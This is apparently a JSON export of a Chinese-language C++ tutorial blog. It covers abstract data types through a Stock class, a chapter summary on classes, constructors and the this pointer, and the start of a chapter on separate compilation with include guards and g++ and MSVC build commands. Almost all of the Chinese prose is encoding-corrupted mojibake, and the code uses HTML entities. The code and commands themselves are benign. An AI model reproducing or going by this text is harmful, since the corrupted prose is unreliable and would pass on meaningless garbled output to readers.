å°†æ•°æ®æˆå‘˜è®¾ä¸º privateï¼Œå¹¶å°†å®ç°ç»†èŠ‚ï¼ˆå¦‚ç§æœ‰è¾…åŠ©å‡½æ•°ã€æˆå‘˜å‡½æ•°çš„å…·ä½“ä»£ç ï¼‰ä¸æ¥å£ï¼ˆç±»å®šä¹‰ä¸­çš„å…¬æœ‰å£°æ˜ï¼‰åˆ†ç¦»ï¼Œå®ç°äº†æ•°æ®éšè—å’Œå°è£…ã€‚ ä»¥ Stock ç±»ä¸ºä¾‹: æˆ‘ä»¬å¯ä»¥å°† Stock ç±»è§†ä¸ºä¸€ä¸ªâ€œè‚¡ç¥¨æŒæœ‰â€ ADTã€‚ ADT æè¿°: ä¸€ä¸ªè¡¨ç¤ºæŸå…¬å¸è‚¡ç¥¨æŒæœ‰æƒ…å†µçš„ç±»å‹ã€‚ æ•°æ® (æ¦‚å¿µä¸Š): å…¬å¸åç§°ã€æŒæœ‰è‚¡æ•°ã€å½“å‰è‚¡ä»·ã€æ€»ä»·å€¼ã€‚ æ“ä½œ (æ¥å£): åˆ›å»ºä¸€ä¸ªè‚¡ç¥¨æŒæœ‰è®°å½•ï¼ˆæ„é€ å‡½æ•°ï¼‰ã€‚ ä¹°å…¥æŒ‡å®šæ•°é‡çš„è‚¡ç¥¨ï¼ˆbuy æ–¹æ³•ï¼‰ã€‚ å–å‡ºæŒ‡å®šæ•°é‡çš„è‚¡ç¥¨ï¼ˆsell æ–¹æ³•ï¼‰ã€‚ æ›´æ–°è‚¡ç¥¨ä»·æ ¼ï¼ˆupdate æ–¹æ³•ï¼‰ã€‚ æ˜¾ç¤ºè‚¡ç¥¨æŒæœ‰ä¿¡æ¯ï¼ˆshow æ–¹æ³•ï¼‰ã€‚ (å¯èƒ½è¿˜æœ‰) è·å–æ€»ä»·å€¼ã€è·å–å…¬å¸åç§°ç­‰ã€‚ å®ç° (éšè—ç»†èŠ‚): æ•°æ®æˆå‘˜ company, shares, share_val, total_val çš„å…·ä½“ç±»å‹ï¼ˆstd::string, long, doubleï¼‰ã€‚ ç§æœ‰è¾…åŠ©å‡½æ•° set_tot() çš„å­˜åœ¨åŠå…¶å®ç°ã€‚ buy, sell, update, show ç­‰å‡½æ•°çš„å…·ä½“ä»£ç é€»è¾‘ã€‚ ä½¿ç”¨ Stock ç±»çš„ç¨‹åºå‘˜ï¼ˆå®¢æˆ·ç«¯ä»£ç ï¼‰åªéœ€è¦äº†è§£å…¶å…¬å…±æ¥å£ï¼ˆpublic æ–¹æ³•ï¼‰ã€‚ä»–ä»¬å¯ä»¥åˆ›å»º Stock å¯¹è±¡ï¼Œè°ƒç”¨ buy(), sell(), show() ç­‰æ–¹æ³•æ¥å®Œæˆä»»åŠ¡ï¼Œè€Œæ— éœ€å…³å¿ƒ total_val æ˜¯å¦‚ä½•è®¡ç®—å’Œæ›´æ–°çš„ï¼Œæˆ–è€… company æ˜¯ç”¨ std::string è¿˜æ˜¯ C é£æ ¼å­—ç¬¦ä¸²å­˜å‚¨çš„ã€‚å¦‚æœç±»çš„è®¾è®¡è€…å†³å®šæ”¹å˜å†…éƒ¨å®ç°ï¼ˆä¾‹å¦‚ï¼Œä¼˜åŒ– set_tot çš„è®¡ç®—ï¼‰ï¼Œåªè¦å…¬å…±æ¥å£ä¿æŒä¸å˜ï¼Œå®¢æˆ·ç«¯ä»£ç å°±æ— éœ€ä¿®æ”¹ã€‚ ADT çš„å¥½å¤„: æŠ½è±¡: ç®€åŒ–å¤æ‚æ€§ï¼Œè®©ç”¨æˆ·å…³æ³¨â€œåšä»€ä¹ˆâ€è€Œéâ€œæ€ä¹ˆåšâ€ã€‚ å°è£…: ä¿æŠ¤æ•°æ®ä¸è¢«æ„å¤–ç ´åï¼Œéšè—å®ç°ç»†èŠ‚ã€‚ æ¨¡å—åŒ–: å°†ç¨‹åºåˆ†è§£ä¸ºç‹¬ç«‹çš„ã€åŠŸèƒ½æ˜ç¡®çš„å•å…ƒï¼ˆç±»/ADTï¼‰ã€‚ å¯ç»´æŠ¤æ€§: ä¿®æ”¹ä¸€ä¸ª ADT çš„å†…éƒ¨å®ç°ä¸ä¼šå½±å“ä½¿ç”¨è¯¥ ADT çš„å…¶ä»–ä»£ç ï¼ˆåªè¦æ¥å£ä¸å˜ï¼‰ã€‚ å¯é‡ç”¨æ€§: è®¾è®¡è‰¯å¥½çš„ ADT å¯ä»¥åœ¨ä¸åŒçš„ç¨‹åºä¸­é‡å¤ä½¿ç”¨ã€‚ å› æ­¤ï¼Œåœ¨è®¾è®¡ C++ ç±»æ—¶ï¼Œä»¥ ADT çš„æ€ç»´æ–¹å¼è¿›è¡Œæ€è€ƒâ€”â€”æ˜ç¡®è¿™ä¸ªç±»ä»£è¡¨ä»€ä¹ˆæ¦‚å¿µï¼Œå®ƒåº”è¯¥æä¾›å“ªäº›æ“ä½œï¼ˆå…¬å…±æ¥å£ï¼‰ï¼Œä»¥åŠéœ€è¦éšè—å“ªäº›å†…éƒ¨ç»†èŠ‚â€”â€”æ˜¯éå¸¸æœ‰ç›Šçš„ã€‚è¿™æœ‰åŠ©äºåˆ›å»ºå‡ºç»“æ„æ¸…æ™°ã€æ˜“äºä½¿ç”¨å’Œç»´æŠ¤çš„ä»£ç ã€‚ 10.8 æ€»ç»“æœ¬ç« ä»‹ç»äº†é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰çš„æ ¸å¿ƒæ¦‚å¿µï¼Œå¹¶æ·±å…¥æ¢è®¨äº† C++ å®ç° OOP çš„ä¸»è¦æœºåˆ¶â€”â€”**ç±» (Class)**ã€‚ç±»æ˜¯ç”¨æˆ·å®šä¹‰ç±»å‹çš„åŸºç¡€ï¼Œå®ƒå…è®¸æˆ‘ä»¬å°†æ•°æ®å’Œæ“ä½œæ•°æ®çš„å‡½æ•°å°è£…åœ¨ä¸€èµ·ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š è¿‡ç¨‹æ€§ç¼–ç¨‹ vs. é¢å‘å¯¹è±¡ç¼–ç¨‹: è¿‡ç¨‹æ€§ç¼–ç¨‹å…³æ³¨æ‰§è¡Œæ­¥éª¤å’Œå‡½æ•°ï¼Œè€Œé¢å‘å¯¹è±¡ç¼–ç¨‹å…³æ³¨æ•°æ®åŠå…¶ç›¸å…³æ“ä½œï¼Œå°†å®ƒä»¬å°è£…åœ¨å¯¹è±¡ (Object) ä¸­ã€‚OOP çš„æ ¸å¿ƒæ€æƒ³åŒ…æ‹¬å°è£…ã€æŠ½è±¡ã€ç»§æ‰¿å’Œå¤šæ€ã€‚ æŠ½è±¡å’Œç±»: æŠ½è±¡æ˜¯å…³æ³¨æœ¬è´¨ç‰¹å¾ã€å¿½ç•¥å®ç°ç»†èŠ‚çš„è¿‡ç¨‹ã€‚ ç±»æ˜¯åˆ›å»ºå¯¹è±¡çš„è“å›¾ï¼Œå®šä¹‰äº†å¯¹è±¡çš„æ•°æ®æˆå‘˜ï¼ˆå±æ€§ï¼‰å’Œæˆå‘˜å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰ã€‚ è®¿é—®è¯´æ˜ç¬¦ï¼ˆpublic, private, protectedï¼‰æ§åˆ¶å¯¹ç±»æˆå‘˜çš„è®¿é—®ã€‚public æˆå‘˜æ„æˆç±»çš„å…¬å…±æ¥å£ï¼Œè€Œ private æˆå‘˜ï¼ˆé€šå¸¸æ˜¯æ•°æ®ï¼‰å®ç°äº†æ•°æ®éšè—ï¼Œæ˜¯å°è£…çš„å…³é”®ã€‚ ç±»çš„æˆå‘˜å‡½æ•°é€šå¸¸åœ¨ç±»å®šä¹‰ä¸­å£°æ˜ï¼Œåœ¨å•ç‹¬çš„æºæ–‡ä»¶ä¸­ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ :: å®šä¹‰ã€‚ é€šè¿‡ç±»çš„å¯¹è±¡ä½¿ç”¨**ç‚¹å· .**ï¼ˆæˆ–æŒ‡é’ˆä½¿ç”¨ç®­å¤´ -&gt;ï¼‰è®¿é—®å…¶å…¬æœ‰æˆå‘˜ã€‚ æ„é€ å‡½æ•°å’Œææ„å‡½æ•°: æ„é€ å‡½æ•°æ˜¯ä¸ç±»åŒåçš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–å¯¹è±¡ã€‚å®ƒå¯ä»¥è¢«é‡è½½ã€‚å¦‚æœç”¨æˆ·æœªå®šä¹‰ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªé»˜è®¤æ„é€ å‡½æ•°ï¼ˆæ— å‚ï¼‰ã€‚å¦‚æœç”¨æˆ·å®šä¹‰äº†ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨å°±ä¸å†ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°ã€‚ ææ„å‡½æ•°æ˜¯ç±»åå‰åŠ  ~ çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œåœ¨å¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºæ‰§è¡Œæ¸…ç†å·¥ä½œï¼ˆå¦‚é‡Šæ”¾ new åˆ†é…çš„å†…å­˜ï¼‰ã€‚å®ƒæ²¡æœ‰å‚æ•°ï¼Œä¸èƒ½é‡è½½ã€‚ this æŒ‡é’ˆ: æ¯ä¸ªéé™æ€æˆå‘˜å‡½æ•°éƒ½æœ‰ä¸€ä¸ªéšå«çš„ this æŒ‡é’ˆï¼ŒæŒ‡å‘è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡ã€‚ é€šå¸¸éšå¼ä½¿ç”¨ï¼Œä½†åœ¨éœ€è¦åŒºåˆ†åŒåå‚æ•°å’Œæˆå‘˜ã€æˆ–éœ€è¦è¿”å›å¯¹è±¡è‡ªèº«å¼•ç”¨/æŒ‡é’ˆï¼ˆå¦‚é“¾å¼è°ƒç”¨ï¼‰æ—¶æ˜¾å¼ä½¿ç”¨ this æˆ– *thisã€‚ å¯¹è±¡æ•°ç»„: å¯ä»¥åˆ›å»ºç±»å¯¹è±¡çš„æ•°ç»„ã€‚ åˆ›å»ºæ•°ç»„æ—¶ï¼Œä¼šä¸ºæ¯ä¸ªå…ƒç´ è°ƒç”¨æ„é€ å‡½æ•°ï¼ˆé€šå¸¸æ˜¯é»˜è®¤æ„é€ å‡½æ•°ï¼Œé™¤éä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ï¼‰ã€‚ è®¿é—®æ–¹å¼ä¸º arrayName[index].memberã€‚ åŠ¨æ€å¯¹è±¡æ•°ç»„ä½¿ç”¨ new ClassName[size] åˆ›å»ºï¼Œéœ€è¦é»˜è®¤æ„é€ å‡½æ•°ï¼Œå¹¶ç”¨ delete [] ptr é‡Šæ”¾ã€‚ ç±»ä½œç”¨åŸŸ: ç±»æˆå‘˜ï¼ˆæ•°æ®ã€å‡½æ•°ã€ç±»å‹ã€å¸¸é‡ã€æšä¸¾ï¼‰å…·æœ‰ç±»ä½œç”¨åŸŸï¼Œåœ¨ç±»å¤–éƒ¨è®¿é—®éœ€è¦é™å®šã€‚ å¯ä»¥ä½¿ç”¨ static const æˆ– static constexpr (C++11 æ¨è) å®šä¹‰ç±»èŒƒå›´å†…çš„å¸¸é‡ã€‚ C++11 å¼•å…¥äº†**ä½œç”¨åŸŸå†…æšä¸¾ (enum class)**ï¼Œæé«˜äº†æšä¸¾çš„ç±»å‹å®‰å…¨æ€§å’Œä½œç”¨åŸŸæ§åˆ¶ã€‚ æŠ½è±¡æ•°æ®ç±»å‹ (ADT): ADT æ˜¯ä¸€ä¸ªä¾§é‡äºæ“ä½œæ¥å£è€Œéå†…éƒ¨å®ç°çš„æ•°å­¦æ¨¡å‹ã€‚ C++ ç±»æ˜¯å®ç° ADT çš„å¼ºå¤§å·¥å…·ï¼Œé€šè¿‡å…¬å…±æ¥å£æä¾›æ“ä½œï¼Œé€šè¿‡ç§æœ‰æˆå‘˜éšè—å®ç°ç»†èŠ‚ï¼Œä½“ç°äº†å°è£…å’ŒæŠ½è±¡çš„åŸåˆ™ã€‚ é€šè¿‡ä½¿ç”¨ç±»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºæ¨¡å—åŒ–ã€å¯é‡ç”¨ã€æ˜“äºç»´æŠ¤çš„å¤æ‚ç¨‹åºï¼Œæ›´å¥½åœ°æ¨¡æ‹Ÿç°å®ä¸–ç•Œçš„é—®é¢˜ã€‚æŒæ¡ç±»çš„è®¾è®¡å’Œä½¿ç”¨æ˜¯ç²¾é€š C++ çš„å…³é”®ä¸€æ­¥ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 9 å†…å­˜æ¨¡å‹å’Œåç§°ç©ºé—´","slug":"Cpp_tutorial_Chapter_9","date":"2025-04-26T12:03:35.395Z","updated":"2025-04-26T12:02:22.963Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_9/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_9/","excerpt":"","text":"9.1 å•ç‹¬ç¼–è¯‘éšç€ç¨‹åºå˜å¾—è¶Šæ¥è¶Šå¤§ï¼Œå°†æ‰€æœ‰ä»£ç éƒ½æ”¾åœ¨ä¸€ä¸ªå·¨å¤§çš„ main.cpp æ–‡ä»¶ä¸­ä¼šå˜å¾—éš¾ä»¥ç®¡ç†å’Œç»´æŠ¤ã€‚C++ æ”¯æŒ**å•ç‹¬ç¼–è¯‘ (Separate Compilation)**ï¼Œå…è®¸æˆ‘ä»¬å°†ç¨‹åºåˆ†è§£æˆå¤šä¸ªç‹¬ç«‹çš„æºæ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ .cpp æ–‡ä»¶ï¼‰å’Œå¤´æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ .h æˆ– .hpp æ–‡ä»¶ï¼‰ã€‚ è¿™æ ·åšçš„å¥½å¤„: ç»„ç»‡æ€§: å°†ç›¸å…³çš„å‡½æ•°ã€ç±»ç­‰æ”¾åœ¨ä¸åŒçš„æ–‡ä»¶ä¸­ï¼Œä½¿é¡¹ç›®ç»“æ„æ›´æ¸…æ™°ã€‚ å¯é‡ç”¨æ€§: å¯ä»¥å°†é€šç”¨çš„åŠŸèƒ½ï¼ˆå¦‚å·¥å…·å‡½æ•°ã€ç±»å®šä¹‰ï¼‰æ”¾åœ¨å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œæ–¹ä¾¿åœ¨å…¶ä»–é¡¹ç›®ä¸­é‡ç”¨ã€‚ æ¨¡å—åŒ–: æ¯ä¸ªæ–‡ä»¶å¯ä»¥ä¸“æ³¨äºç‰¹å®šçš„åŠŸèƒ½æ¨¡å—ã€‚ ç¼–è¯‘æ•ˆç‡: å½“ä¿®æ”¹æŸä¸ª .cpp æ–‡ä»¶æ—¶ï¼Œé€šå¸¸åªéœ€è¦é‡æ–°ç¼–è¯‘è¯¥æ–‡ä»¶ï¼Œç„¶åä¸å…¶ä»–æœªæ”¹å˜çš„ç›®æ ‡æ–‡ä»¶é‡æ–°é“¾æ¥å³å¯ï¼Œæ— éœ€é‡æ–°ç¼–è¯‘æ•´ä¸ªé¡¹ç›®ï¼Œå¤§å¤§èŠ‚çœäº†ç¼–è¯‘æ—¶é—´ã€‚ åŸºæœ¬æ¦‚å¿µå•ç‹¬ç¼–è¯‘é€šå¸¸æ¶‰åŠä¸¤ç§ä¸»è¦çš„æ–‡ä»¶ç±»å‹ï¼š å¤´æ–‡ä»¶ (.h æˆ– .hpp): ç›®çš„: åŒ…å«**å£°æ˜ (Declarations)**ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨æŸä¸ªå‡½æ•°ã€ç±»æˆ–å˜é‡çš„â€œæ¥å£â€æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä½†ä¸åŒ…å«å…·ä½“çš„å®ç°ä»£ç ï¼ˆé™¤äº†æ¨¡æ¿å’Œå†…è”å‡½æ•°ï¼‰ã€‚ å…¸å‹å†…å®¹: å‡½æ•°åŸå‹ï¼ˆå‡½æ•°å£°æ˜ï¼‰ ç±» (class) å®šä¹‰ ç»“æ„ (struct) å®šä¹‰ æšä¸¾ (enum) å®šä¹‰ æ¨¡æ¿ (template) å®šä¹‰ å†…è”å‡½æ•° (inline) å®šä¹‰ const å¸¸é‡å®šä¹‰ using å£°æ˜æˆ–æŒ‡ä»¤ #include æŒ‡ä»¤: æºæ–‡ä»¶é€šè¿‡ #include &quot;header_file.h&quot; æŒ‡ä»¤å°†å¤´æ–‡ä»¶çš„å†…å®¹åŒ…å«è¿›æ¥ï¼Œä»¥ä¾¿ç¼–è¯‘å™¨çŸ¥é“å¦‚ä½•ä½¿ç”¨å…¶ä¸­å£°æ˜çš„å‡½æ•°æˆ–ç±»ã€‚ åŒ…å«å«å“¨ (Include Guards): ä¸ºäº†é˜²æ­¢åŒä¸€ä¸ªå¤´æ–‡ä»¶è¢«æ„å¤–åœ°å¤šæ¬¡åŒ…å«åˆ°åŒä¸€ä¸ªæºæ–‡ä»¶ä¸­ï¼ˆè¿™å¯èƒ½å¯¼è‡´é‡å®šä¹‰é”™è¯¯ï¼‰ï¼Œå¤´æ–‡ä»¶é€šå¸¸ä½¿ç”¨åŒ…å«å«å“¨ã€‚ 123456789// myheader.h#ifndef MYHEADER_H_ // å¦‚æœ MYHEADER_H_ è¿˜æ²¡æœ‰è¢«å®šä¹‰è¿‡#define MYHEADER_H_ // å°±å®šä¹‰ MYHEADER_H_// å¤´æ–‡ä»¶çš„å®é™…å†…å®¹æ”¾åœ¨è¿™é‡Œ...void my_function(int x);class MyClass &#123; /* ... */ &#125;;#endif // MYHEADER_H_ æˆ–è€…ä½¿ç”¨ C++ ç‰¹æœ‰çš„ #pragma once æŒ‡ä»¤ï¼ˆæ›´ç®€æ´ï¼Œä½†ä¸æ˜¯æ‰€æœ‰ç¼–è¯‘å™¨éƒ½æ”¯æŒï¼Œå°½ç®¡éå¸¸æ™®éï¼‰ï¼š 123456// myheader.h#pragma once// å¤´æ–‡ä»¶çš„å®é™…å†…å®¹æ”¾åœ¨è¿™é‡Œ...void my_function(int x);class MyClass &#123; /* ... */ &#125;; æºæ–‡ä»¶ (.cpp): ç›®çš„: åŒ…å«**å®šä¹‰ (Definitions)**ï¼Œå³å‡½æ•°æˆ–æ–¹æ³•çš„å…·ä½“å®ç°ä»£ç ï¼Œä»¥åŠå…¨å±€å˜é‡çš„å®šä¹‰å’Œåˆå§‹åŒ–ã€‚ å…¸å‹å†…å®¹: å‡½æ•°ä½“ï¼ˆå®ç°ï¼‰ ç±»æˆå‘˜å‡½æ•°çš„å®ç° å…¨å±€å˜é‡çš„å®šä¹‰å’Œåˆå§‹åŒ– main å‡½æ•°ï¼ˆé€šå¸¸åœ¨ä¸€ä¸ªå•ç‹¬çš„ .cpp æ–‡ä»¶ä¸­ï¼‰ ç¼–è¯‘: æ¯ä¸ª .cpp æ–‡ä»¶é€šå¸¸ä¼šè¢«ç¼–è¯‘å™¨ç‹¬ç«‹åœ°ç¼–è¯‘æˆä¸€ä¸ª**ç›®æ ‡æ–‡ä»¶ (Object File)**ï¼ˆé€šå¸¸æ˜¯ .obj æˆ– .o æ–‡ä»¶ï¼‰ã€‚ç›®æ ‡æ–‡ä»¶åŒ…å«äº†è¯¥æºæ–‡ä»¶å¯¹åº”çš„æœºå™¨ä»£ç ï¼Œä½†å¯èƒ½è¿˜åŒ…å«å¯¹å…¶ä»–æ–‡ä»¶ä¸­å®šä¹‰çš„å‡½æ•°æˆ–å˜é‡çš„å¼•ç”¨ã€‚ ç¼–è¯‘å’Œé“¾æ¥è¿‡ç¨‹åœ¨C++ä¸­ï¼Œå°†æºä»£ç è½¬æ¢ä¸ºå¯æ‰§è¡Œç¨‹åºé€šå¸¸åˆ†ä¸ºç¼–è¯‘å’Œé“¾æ¥ä¸¤ä¸ªä¸»è¦é˜¶æ®µã€‚è®©æˆ‘ä»¬çœ‹çœ‹è¿™äº›è¿‡ç¨‹ä¸­æ¶‰åŠçš„å…·ä½“å‘½ä»¤ï¼š ç¼–è¯‘å‘½ä»¤ä½¿ç”¨g++ï¼ˆGNU C++ ç¼–è¯‘å™¨ï¼‰: 123456789## ç¼–è¯‘å•ä¸ªæºæ–‡ä»¶g++ -c utils.cpp # ç”Ÿæˆ utils.o ç›®æ ‡æ–‡ä»¶g++ -c main.cpp # ç”Ÿæˆ main.o ç›®æ ‡æ–‡ä»¶## æ·»åŠ ä¼˜åŒ–é€‰é¡¹g++ -c -O2 utils.cpp # ä½¿ç”¨O2çº§åˆ«çš„ä¼˜åŒ–## æ·»åŠ è°ƒè¯•ä¿¡æ¯g++ -c -g utils.cpp # åŒ…å«è°ƒè¯•ä¿¡æ¯ ä½¿ç”¨MSVCï¼ˆMicrosoft Visual C++ï¼‰: 123456789## ç¼–è¯‘å•ä¸ªæºæ–‡ä»¶cl /c utils.cpp # ç”Ÿæˆ utils.obj ç›®æ ‡æ–‡ä»¶cl /c main.cpp # ç”Ÿæˆ main.obj ç›®æ ‡æ–‡ä»¶## æ·»åŠ ä¼˜åŒ–é€‰é¡¹cl /c /O2 utils.cpp # ä½¿ç”¨O2çº§åˆ«çš„ä¼˜åŒ–## æ·»åŠ è°ƒè¯•ä¿¡æ¯cl /c /Zi utils.cpp # åŒ…å«è°ƒè¯•ä¿¡æ¯ é“¾æ¥å‘½ä»¤ä½¿ç”¨g++: 12345## é“¾æ¥ç›®æ ‡æ–‡ä»¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶g++ main.o utils.o -o myprogram## é“¾æ¥å¹¶æŒ‡å®šåº“æ–‡ä»¶g++ main.o utils.o -lmath -o myprogram ä½¿ç”¨MSVC: 12345## é“¾æ¥ç›®æ ‡æ–‡ä»¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶link main.obj utils.obj /OUT:myprogram.exe## é“¾æ¥å¹¶æŒ‡å®šåº“æ–‡ä»¶link main.obj utils.obj math.lib /OUT:myprogram.exe ä¸€æ­¥å®Œæˆç¼–è¯‘å’Œé“¾æ¥é€šå¸¸ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªå‘½ä»¤ä¸­å®Œæˆç¼–è¯‘å’Œé“¾æ¥: 12345## ä½¿ç”¨g++g++ main.cpp utils.cpp -o myprogram## ä½¿ç”¨MSVCcl main.cpp utils.cpp /Fe:myprogram.exe ç¼–è¯‘å™¨ä¼šè‡ªåŠ¨å¤„ç†ä¸­é—´æ­¥éª¤ï¼Œç”Ÿæˆå¿…è¦çš„ç›®æ ‡æ–‡ä»¶ï¼Œç„¶åé“¾æ¥å®ƒä»¬åˆ›å»ºæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ ä¸€ä¸ªåŒ…å«å¤šä¸ªæ–‡ä»¶çš„ C++ é¡¹ç›®çš„å…¸å‹æ„å»ºè¿‡ç¨‹å¦‚ä¸‹ï¼š ç¼–è¯‘ (Compilation): ç¼–è¯‘å™¨åˆ†åˆ«å¤„ç†æ¯ä¸ª .cpp æºæ–‡ä»¶ã€‚å¯¹äºæ¯ä¸ª .cpp æ–‡ä»¶ï¼š é¢„å¤„ç†å™¨å¤„ç† #include æŒ‡ä»¤ï¼Œå°†å¤´æ–‡ä»¶çš„å†…å®¹æ’å…¥åˆ°æºæ–‡ä»¶ä¸­ã€‚ ç¼–è¯‘å™¨å°†å¤„ç†åçš„æºä»£ç ç¿»è¯‘æˆæœºå™¨ç ï¼Œç”Ÿæˆä¸€ä¸ªç›®æ ‡æ–‡ä»¶ (.obj æˆ– .o)ã€‚ é“¾æ¥ (Linking): é“¾æ¥å™¨ (Linker) å°†æ‰€æœ‰ç”±ç¼–è¯‘å™¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä»¥åŠå¯èƒ½éœ€è¦çš„åº“æ–‡ä»¶ï¼ˆåŒ…å«é¢„ç¼–è¯‘ä»£ç ï¼Œå¦‚æ ‡å‡†åº“ï¼‰ç»„åˆåœ¨ä¸€èµ·ã€‚ é“¾æ¥å™¨è´Ÿè´£è§£æç›®æ ‡æ–‡ä»¶ä¹‹é—´çš„äº¤å‰å¼•ç”¨ï¼ˆä¾‹å¦‚ï¼Œmain.cpp è°ƒç”¨äº†åœ¨ utils.cpp ä¸­å®šä¹‰çš„å‡½æ•°ï¼‰ã€‚ å¦‚æœæ‰€æœ‰å¼•ç”¨éƒ½èƒ½æ‰¾åˆ°å¯¹åº”çš„å®šä¹‰ï¼Œå¹¶ä¸”æ²¡æœ‰é‡å®šä¹‰ç­‰é”™è¯¯ï¼Œé“¾æ¥å™¨å°±ä¼šç”Ÿæˆæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚ .exe æ–‡ä»¶ï¼‰ã€‚ ç¤ºä¾‹å‡è®¾æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®€å•çš„é¡¹ç›®ï¼ŒåŒ…å«ä¸€ä¸ªè®¡ç®—åŠŸèƒ½çš„å·¥å…·å‡½æ•°ã€‚ 1. å¤´æ–‡ä»¶ (utils.h) åŒ…å«å‡½æ•°å£°æ˜å’ŒåŒ…å«å«å“¨ã€‚ 12345678// filepath: d:\\ProgramData\\files_Cpp\\250424\\utils.h#ifndef UTILS_H_#define UTILS_H_// å‡½æ•°åŸå‹ (å£°æ˜)int add(int a, int b);#endif // UTILS_H_ 2. æºæ–‡ä»¶ (utils.cpp) åŒ…å«å‡½æ•°çš„å…·ä½“å®ç°ã€‚å®ƒéœ€è¦åŒ…å«è‡ªå·±çš„å¤´æ–‡ä»¶ä»¥ç¡®ä¿å£°æ˜å’Œå®šä¹‰åŒ¹é…ã€‚ 1234567// filepath: d:\\ProgramData\\files_Cpp\\250424\\utils.cpp#include &quot;utils.h&quot; // åŒ…å«å¤´æ–‡ä»¶// å‡½æ•°å®šä¹‰ (å®ç°)int add(int a, int b) &#123; return a + b;&#125; 3. ä¸»ç¨‹åºæ–‡ä»¶ (main.cpp) ä½¿ç”¨ utils.h ä¸­å£°æ˜çš„å‡½æ•°ã€‚ 12345678910111213// filepath: d:\\ProgramData\\files_Cpp\\250424\\main.cpp#include &lt;iostream&gt;#include &quot;utils.h&quot; // åŒ…å«å¤´æ–‡ä»¶ä»¥ä½¿ç”¨ add å‡½æ•°int main() &#123; int x = 5; int y = 3; int sum = add(x, y); // è°ƒç”¨åœ¨ utils.cpp ä¸­å®šä¹‰çš„å‡½æ•° std::cout &lt;&lt; &quot;The sum of &quot; &lt;&lt; x &lt;&lt; &quot; and &quot; &lt;&lt; y &lt;&lt; &quot; is: &quot; &lt;&lt; sum &lt;&lt; std::endl; return 0;&#125; æ„å»ºè¿‡ç¨‹: ç¼–è¯‘ utils.cpp: compiler utils.cpp -&gt; utils.obj ç¼–è¯‘ main.cpp: compiler main.cpp -&gt; main.obj é“¾æ¥: linker main.obj utils.obj -&gt; myprogram.exe (æˆ–ç±»ä¼¼åç§°) å£°æ˜ vs. å®šä¹‰: ç†è§£å£°æ˜å’Œå®šä¹‰çš„åŒºåˆ«å¯¹äºå•ç‹¬ç¼–è¯‘è‡³å…³é‡è¦ï¼š å£°æ˜ (Declaration): å‘Šè¯‰ç¼–è¯‘å™¨æŸä¸ªä¸œè¥¿ï¼ˆå‡½æ•°ã€å˜é‡ã€ç±»ç­‰ï¼‰çš„å­˜åœ¨åŠå…¶æ¥å£ï¼ˆåç§°ã€ç±»å‹ã€å‚æ•°ç­‰ï¼‰ã€‚ä¸€ä¸ªå£°æ˜å¯ä»¥å‡ºç°å¤šæ¬¡ï¼ˆåªè¦å®ƒä»¬ä¸€è‡´ï¼‰ã€‚å¤´æ–‡ä»¶ä¸»è¦åŒ…å«å£°æ˜ã€‚ å®šä¹‰ (Definition): æä¾›äº†æŸä¸ªä¸œè¥¿çš„å…·ä½“å®ç°æˆ–å†…å­˜åˆ†é…ã€‚å¯¹äºéå†…è”å‡½æ•°å’Œéé™æ€æ•°æ®æˆå‘˜ï¼Œä¸€ä¸ªå®šä¹‰åœ¨ä¸€ä¸ªç¨‹åºä¸­åªèƒ½å‡ºç°ä¸€æ¬¡ï¼ˆå•ä¸€å®šä¹‰è§„åˆ™ - One Definition Rule, ODRï¼‰ã€‚æºæ–‡ä»¶ä¸»è¦åŒ…å«å®šä¹‰ã€‚ å¤´æ–‡ä»¶å……å½“äº†ä¸åŒæºæ–‡ä»¶ä¹‹é—´çš„â€œå¥‘çº¦â€ï¼Œç¡®ä¿å®ƒä»¬å¯¹å…±äº«çš„å‡½æ•°å’Œç±»æœ‰å…±åŒçš„ç†è§£ï¼Œè€Œé“¾æ¥å™¨åˆ™è´Ÿè´£å°†è¿™äº›éƒ¨åˆ†æœ€ç»ˆç»„è£…åœ¨ä¸€èµ·ã€‚ 9.2 å­˜å‚¨æŒç»­æ€§ã€ä½œç”¨åŸŸå’Œé“¾æ¥æ€§C++ 